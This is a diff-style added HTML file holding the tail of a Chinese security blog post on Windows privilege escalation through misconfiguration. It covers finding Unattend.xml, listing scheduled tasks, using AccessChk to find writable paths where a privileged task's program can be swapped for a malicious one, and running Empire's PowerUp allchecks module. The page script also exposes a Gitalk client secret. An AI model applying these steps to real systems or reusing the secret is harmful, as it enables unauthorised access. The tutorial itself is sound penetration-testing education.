+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &#x2F;b &#x2F;s c:\Unattend.xml</span><br></pre></td></tr></table></figure>
+<p>Metasploit集成了该漏洞的利用模块 post/windows/gather/enum_unattend</p>
+<h4 id="5、计划任务"><a href="#5、计划任务" class="headerlink" title="5、计划任务"></a>5、计划任务</h4><p>查看计算机计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk" target="_blank" rel="noopener">【AccsChk】</a>是Syslnteraks 套件中的一个工具，由Mnk Rusnoih编写用于在Wndows中进行一些系统或程序的高级查询、管理和故障排除工作，基于杀毒软件的检测等，攻击者会尽量避免接触目标机器的磁盘。而AcsCce是微软官方提供的工具，一般不会引起杀毒软件的报警，所以经常会被攻击者利用。<br>执行如下命令，查看指定目录的权限配置情况。如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样，在计划任务下次执行时，就会以高权限来运行恶意程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -dqv &quot;C:\Microsoft&quot; -accepteula</span><br></pre></td></tr></table></figure>
+<p>下面介绍几个常用的AccessChk命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">第一次运行Sysntemals工具包里的工具时，会弹出一个许可协议对话框。在这里，可以使用参数&#x2F;accepteula自动接受许可协议，命令如下。</span><br><span class="line">accesschk.exe &#x2F;accepteula</span><br><span class="line"> </span><br><span class="line">列出某个驱动器下所有权限配置有缺陷的文件夹，命令如下。</span><br><span class="line">accesschk.exe -uwdqsUsersc:\</span><br><span class="line">accesschk.exe -uwdqg&quot;AuthenticatedUsers&quot;c:\</span><br><span class="line"> </span><br><span class="line">列出某个驱动器下所有权限配置有缺陷的文件，命令如下。</span><br><span class="line">accesschk.exe -uwqsUsersc:\*.*</span><br><span class="line">accesschk.exe -uwqs&quot;AuthenticatedUsers&quot;c:\*.*</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="6、Empire-内置模块"><a href="#6、Empire-内置模块" class="headerlink" title="6、Empire 内置模块"></a>6、Empire 内置模块</h4><p>Empire内置了PowerUp的部分模块。输入<code>usemodule privesc/powerup</code> 命令然后按tab键可以查看powerUp的模块列表。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc&#x2F;powerup Tab    #查看模块列表</span><br><span class="line">### 执行allchecks模块</span><br><span class="line">usemodule privesc&#x2F;powerup&#x2F;allchecks</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+<p>AllChecks模块的应用对象如下：</p>
+<ul>
+<li>没有被引号引起来的服务的路径。</li>
+<li>ACL配置错误的服务（攻击者通常通过“service_*”利用它)。</li>
+<li>服务的可执行文件的权限设置不当(攻击者通常通过“service_exe_*”利用它)。</li>
+<li>Unattend.xml 文件。</li>
+<li>注册表键AlwaysInstallElevated。</li>
+<li>如果有Autologon 凭证,都会留在注册表中。</li>
+<li>加密的web.config字符串和应用程序池的密码。</li>
+<li>%PATH%.DLL的劫持机会（攻击者通常通过 write_dllhijacker利用它).</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2021/04/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B9%8B%E6%BA%A2%E5%87%BA%E5%92%8C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/" title="权限提升之溢出和系统配置错误">https://mayi077.github.io/2021/04/01/权限提升之溢出和系统配置错误/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i>提权</a>
+              <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"><i class="fa fa-tag"></i>内网</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/24/%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E4%B9%8BSOCKS%E4%BB%A3%E7%90%86/" rel="prev" title="隐藏隧道技术之SOCKS代理">
+      <i class="fa fa-chevron-left"></i> 隐藏隧道技术之SOCKS代理
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/06/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B9%8B%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E5%92%8C%E7%BB%95%E8%BF%87UAC/" rel="next" title="权限提升之组策略首选项和绕过UAC">
+      权限提升之组策略首选项和绕过UAC <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-横向提权和纵向提权"><span class="nav-number">1.</span> <span class="nav-text">0x01 横向提权和纵向提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-利用系统内核溢出漏洞提权分析"><span class="nav-number">2.</span> <span class="nav-text">0x02 利用系统内核溢出漏洞提权分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、通过手动执行命令发现缺失补丁"><span class="nav-number">2.1.</span> <span class="nav-text">1、通过手动执行命令发现缺失补丁</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用-powershell脚本"><span class="nav-number">2.1.1.</span> <span class="nav-text">利用 powershell脚本</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、通过metasploit发现缺失补丁"><span class="nav-number">2.2.</span> <span class="nav-text">2、通过metasploit发现缺失补丁</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、Windows-exploit-suggester"><span class="nav-number">2.3.</span> <span class="nav-text">3、Windows exploit suggester</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、利用powershell的sherlock脚本查找提权漏洞"><span class="nav-number">2.4.</span> <span class="nav-text">4、利用powershell的sherlock脚本查找提权漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Windows-系统配置错误利用"><span class="nav-number">3.</span> <span class="nav-text">0x03 Windows 系统配置错误利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、系统服务权限配置错误"><span class="nav-number">3.1.</span> <span class="nav-text">1、系统服务权限配置错误</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-PowerUp-下的实战利用"><span class="nav-number">3.1.1.</span> <span class="nav-text">(1) PowerUp 下的实战利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-Metasploit-下的实战利用"><span class="nav-number">3.1.2.</span> <span class="nav-text">(2) Metasploit 下的实战利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、注册表键-AlwaysInstallElevated"><span class="nav-number">3.2.</span> <span class="nav-text">2、注册表键 AlwaysInstallElevated</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、可信任服务路径漏洞"><span class="nav-number">3.3.</span> <span class="nav-text">3、可信任服务路径漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-漏洞产生的原因"><span class="nav-number">3.3.1.</span> <span class="nav-text">(1) 漏洞产生的原因</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-利用"><span class="nav-number">3.3.2.</span> <span class="nav-text">(2) 利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、自动安装配置文件"><span class="nav-number">3.4.</span> <span class="nav-text">4、自动安装配置文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5、计划任务"><span class="nav-number">3.5.</span> <span class="nav-text">5、计划任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6、Empire-内置模块"><span class="nav-number">3.6.</span> <span class="nav-text">6、Empire 内置模块</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : '25c702d37935e5aeb49ea7ac200cb8a8',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
